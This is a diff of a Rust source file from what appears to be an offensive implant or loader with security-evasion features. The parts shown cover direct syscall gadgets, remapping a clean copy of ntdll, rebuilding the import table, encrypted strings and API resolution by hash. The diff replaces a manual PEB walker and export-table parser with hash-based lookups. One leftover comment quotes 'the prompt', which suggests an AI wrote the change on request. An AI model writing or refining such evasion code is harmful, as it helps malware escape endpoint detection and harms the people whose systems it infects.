@@ -5,46 +5,9 @@
     feature = "direct-syscalls"
 ))]
 
-// PEB / LDR structures are only used by the Windows PEB-walk code.
-// On Linux the file compiles for its syscall-number tables, but winapi types
-// are unavailable there.  Gate these definitions to Windows only (B-03 fix).
+use anyhow::Result;
 #[cfg(windows)]
-#[repr(C)]
-struct PEB {
-    InheritedAddressSpace: u8,
-    ReadImageFileExecOptions: u8,
-    BeingDebugged: u8,
-    BitFields: u8,
-    Mutant: *mut std::os::raw::c_void,
-    ImageBaseAddress: *mut std::os::raw::c_void,
-    Ldr: *mut PEB_LDR_DATA,
-}
-
-#[cfg(windows)]
-#[repr(C)]
-struct PEB_LDR_DATA {
-    Length: u32,
-    Initialized: u8,
-    SsHandle: *mut std::os::raw::c_void,
-    InLoadOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
-    InMemoryOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
-    InInitializationOrderModuleList: winapi::shared::ntdef::LIST_ENTRY,
-}
-
-#[cfg(windows)]
-#[repr(C)]
-struct LDR_DATA_TABLE_ENTRY {
-    InLoadOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
-    InMemoryOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
-    InInitializationOrderLinks: winapi::shared::ntdef::LIST_ENTRY,
-    DllBase: *mut std::os::raw::c_void,
-    EntryPoint: *mut std::os::raw::c_void,
-    SizeOfImage: u32,
-    FullDllName: winapi::shared::ntdef::UNICODE_STRING,
-    BaseDllName: winapi::shared::ntdef::UNICODE_STRING,
-}
-
-use anyhow::{anyhow, Result};
+use anyhow::anyhow;
 #[cfg(windows)]
 use std::arch::asm;
 
@@ -65,94 +28,6 @@ static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock:
 pub struct SyscallTarget {
     pub ssn: u32,
     pub gadget_addr: usize,
-}
-
-/// Byte offsets used when walking the PEB → Ldr → InMemoryOrderModuleList.
-///
-/// All values are offsets *from the start of the `InMemoryOrderLinks` pointer*
-/// (i.e. from the list-entry cursor, which points at
-/// `LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks`).
-///
-/// Default values are derived from the x64 Windows 10/11 `ntdll` LDR layout,
-/// which has been stable since Windows Vista for 64-bit processes.  A future
-/// Windows version that changes the layout will only need to update these
-/// constants (or the `get_peb_offsets` resolver).
-#[cfg(windows)]
-#[derive(Clone, Copy, Debug)]
-struct PebOffsets {
-    /// Byte delta from `&entry.InMemoryOrderLinks` to `entry.DllBase`.
-    /// Win10/11 x64: LDR_DATA_TABLE_ENTRY.DllBase @ +0x30, InMemoryOrderLinks @ +0x10 → delta 0x20.
-    dll_base_from_imol: usize,
-    /// Byte delta from `&entry.InMemoryOrderLinks` to `entry.FullDllName`.
-    /// Win10/11 x64: FullDllName @ +0x48, InMemoryOrderLinks @ +0x10 → delta 0x38.
-    full_dll_name_from_imol: usize,
-}
-
-#[cfg(windows)]
-impl Default for PebOffsets {
-    fn default() -> Self {
-        // Derived from #[repr(C)] LDR_DATA_TABLE_ENTRY layout below:
-        //   InLoadOrderLinks      @ +0x00  (LIST_ENTRY = 16 bytes on x64)
-        //   InMemoryOrderLinks    @ +0x10  (16 bytes)
-        //   InInitOrderLinks      @ +0x20  (16 bytes)
-        //   DllBase               @ +0x30  (*mut c_void = 8 bytes)
-        //   EntryPoint            @ +0x38  (8 bytes)
-        //   SizeOfImage           @ +0x40  (u32, 4 bytes + 4 pad)
-        //   FullDllName           @ +0x48  (UNICODE_STRING = 16 bytes on x64)
-        //   BaseDllName           @ +0x58  (UNICODE_STRING = 16 bytes on x64)
-        Self {
-            dll_base_from_imol: 0x30 - 0x10,      // 0x20
-            full_dll_name_from_imol: 0x48 - 0x10,  // 0x38
-        }
-    }
-}
-
-#[cfg(windows)]
-static PEB_OFFSETS: OnceLock<PebOffsets> = OnceLock::new();
-
-/// Return a reference to the cached PEB offsets, initialising on first call.
-///
-/// Initialisation derives the offsets from the compile-time `#[repr(C)]`
-/// `LDR_DATA_TABLE_ENTRY` layout.  If that cannot be verified (e.g. the sizes
-/// do not match expectations) the Win10/11 x64 defaults are returned, which
-/// are the same values — this path exists for forward-compatibility.
-#[cfg(windows)]
-fn get_peb_offsets() -> &'static PebOffsets {
-    PEB_OFFSETS.get_or_init(|| {
-        // Derive from the struct defined in this file.  If the constants match
-        // the defaults we know they are correct for the running platform.
-        let imol_offset = {
-            // offsetof!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
-            // InLoadOrderLinks is a LIST_ENTRY (2 × *mut LIST_ENTRY = 16 bytes on x64)
-            std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>()
-        };
-        let dll_base_offset = imol_offset
-            + std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>()  // InMemoryOrderLinks
-            + std::mem::size_of::<winapi::shared::ntdef::LIST_ENTRY>(); // InInitializationOrderLinks
-        let full_name_offset = dll_base_offset
-            + std::mem::size_of::<*mut std::os::raw::c_void>()  // DllBase
-            + std::mem::size_of::<*mut std::os::raw::c_void>()  // EntryPoint
-            + std::mem::size_of::<u64>();                        // SizeOfImage (u32 + 4-byte pad)
-
-        let defaults = PebOffsets::default();
-        // Sanity-check: if computed offsets differ from Win10/11 defaults, fall back.
-        if dll_base_offset - imol_offset == defaults.dll_base_from_imol
-            && full_name_offset - imol_offset == defaults.full_dll_name_from_imol
-        {
-            PebOffsets {
-                dll_base_from_imol: dll_base_offset - imol_offset,
-                full_dll_name_from_imol: full_name_offset - imol_offset,
-            }
-        } else {
-            tracing::warn!(
-                "PEB offsets from struct layout (dll_base={:#x}, full_name={:#x}) differ from \
-                 Win10/11 defaults; using defaults",
-                dll_base_offset - imol_offset,
-                full_name_offset - imol_offset,
-            );
-            defaults
-        }
-    })
 }
 
 #[cfg(windows)]
@@ -267,58 +142,10 @@ fn map_clean_ntdll() -> Result<usize> {
         .collect::<Vec<u16>>();
 
     unsafe {
-        // Need to find *any* mapped syscall gadget we can use. We can just use the loaded ntdll's gadget dynamically, or build one in memory.
-        // Wait, the prompt says "remove all references to the loaded module's export table".
-        // We can just scan PEB -> Ldr for ntdll and scan the loaded .text section for 0x0F 0x05 without parsing exports!
-        let loaded_ntdll_base = {
-            use winapi::um::winnt::NT_TIB;
-            // TEB/PEB are in winapi::um::winternl
-            // using raw pointers instead of winternl PEB
-            let peb: *const PEB;
-            asm!(
-                "mov {}, gs:[0x60]",
-                out(reg) peb,
-                options(nostack, readonly)
-            );
-            let ldr = (*peb).Ldr;
-            let head = &(*ldr).InMemoryOrderModuleList as *const _
-                as *mut winapi::shared::ntdef::LIST_ENTRY;
-            let mut curr = (*head).Flink;
-            let mut found_base = 0;
-            // First entry is usually the executable, second is ntdll
-            while curr != head {
-                let entry = curr as *const u8;
-                // InMemoryOrder links point at LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks.
-                // Use cached PebOffsets to find DllBase and FullDllName without
-                // hardcoding magic numbers.
-                let offsets = get_peb_offsets();
-                let dll_base_ptr =
-                    entry.add(offsets.dll_base_from_imol) as *const *mut std::os::raw::c_void;
-                let full_name_ptr = entry.add(offsets.full_dll_name_from_imol)
-                    as *const winapi::shared::ntdef::UNICODE_STRING;
-
-                let base = *dll_base_ptr;
-                let name = *full_name_ptr;
-                if !base.is_null() && name.Buffer != std::ptr::null_mut() {
-                    let name_slice =
-                        std::slice::from_raw_parts(name.Buffer, (name.Length / 2) as usize);
-                    let name_str = String::from_utf16_lossy(name_slice).to_lowercase();
-                    if name_str.contains(
-                        String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll"))
-                            .trim_end_matches('\0'),
-                    ) {
-                        found_base = base as usize;
-                        break;
-                    }
-                }
-                curr = (*curr).Flink;
-            }
-            found_base
-        };
-
-        if loaded_ntdll_base == 0 {
-            return Err(anyhow!("Could not find loaded ntdll base in PEB"));
-        }
+        // Resolve loaded ntdll via the shared pe_resolve module to avoid
+        // maintaining a duplicate local PEB/LDR walker in this file.
+        let loaded_ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+            .ok_or_else(|| anyhow!("Could not resolve loaded ntdll base"))?;
 
         // Find gadget
         let mut gadget_addr = 0;
@@ -1019,95 +846,13 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
 
 #[cfg(windows)]
 unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
-    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+    if func_name_ptr.is_null() {
         return 0;
     }
 
-    let nt_headers =
-        (base + (*dos_header).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory
-        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
-        .VirtualAddress;
-    if export_dir_rva == 0 {
-        return 0;
-    }
-
-    let export_dir =
-        (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
-    let num_names = (*export_dir).NumberOfNames as usize;
-    let names = (base + (*export_dir).AddressOfNames as usize) as *const u32;
-    let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
-    let ords = (base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
-
-    let target_name = std::ffi::CStr::from_ptr(func_name_ptr).to_bytes();
-
-    for i in 0..num_names {
-        let name_rva = *names.add(i);
-        let name_ptr = (base + name_rva as usize) as *const i8;
-        let c_name = std::ffi::CStr::from_ptr(name_ptr).to_bytes();
-
-        if c_name == target_name {
-            let ord = *ords.add(i);
-            let func_rva = *funcs.add(ord as usize) as usize;
-
-            // Forwarded export check: if the function RVA falls within the
-            // export directory itself, it points to an ASCII "DLL.FuncName"
-            // forward string — not executable code.
-            let export_dir_start = export_dir_rva as usize;
-            // Approximate upper bound: include name and function arrays after the dir.
-            let export_dir_end = export_dir_start
-                + (*export_dir).NumberOfNames as usize * 4
-                + (*export_dir).NumberOfFunctions as usize * 4;
-            if func_rva >= export_dir_start && func_rva < export_dir_end {
-                // M-26: resolve the forwarded export recursively rather than
-                // returning 0 (which forced callers down the hooked-IAT path).
-                let forward_str_ptr = (base + func_rva) as *const i8;
-                let forward_cstr = std::ffi::CStr::from_ptr(forward_str_ptr);
-                let forward_str = match forward_cstr.to_str() {
-                    Ok(s) => s,
-                    Err(_) => return 0,
-                };
-                let (dll_part, func_part) = match forward_str.find('.') {
-                    Some(dot_pos) => (&forward_str[..dot_pos], &forward_str[dot_pos + 1..]),
-                    None => return 0,
-                };
-                let dll_name_with_ext = format!("{}.dll", dll_part);
-                let dll_lower = dll_name_with_ext.to_lowercase();
-
-                // Resolve the forward target from a clean-mapped copy.
-                let target_base = match map_clean_dll(&dll_lower) {
-                    Ok(b) => b,
-                    Err(_) => CLEAN_MODULES
-                        .get()
-                        .and_then(|m| m.lock().unwrap().get(&dll_lower).copied())
-                        .unwrap_or(0),
-                };
-                if target_base == 0 {
-                    return 0;
-                }
-
-                // "#123" → ordinal; otherwise named export.
-                if let Some(stripped) = func_part.strip_prefix('#') {
-                    if let Ok(ordinal) = stripped.parse::<u32>() {
-                        let addr = get_export_addr_by_ordinal(target_base, ordinal);
-                        return addr as usize;
-                    }
-                }
-                let mut func_name_null = func_part.as_bytes().to_vec();
-                func_name_null.push(0);
-                let target_hash = pe_resolve::hash_str(&func_name_null);
-                if let Some(addr) = pe_resolve::get_proc_address_by_hash(target_base, target_hash) {
-                    return addr;
-                }
-                return get_export_addr(target_base, func_name_null.as_ptr() as *const i8);
-            }
-
-            return base + func_rva;
-        }
-    }
-
-    0
+    let target_name = std::ffi::CStr::from_ptr(func_name_ptr).to_bytes_with_nul();
+    let target_hash = pe_resolve::hash_str(target_name);
+    pe_resolve::get_proc_address_by_hash(base, target_hash).unwrap_or(0)
 }
 
 #[cfg(windows)]
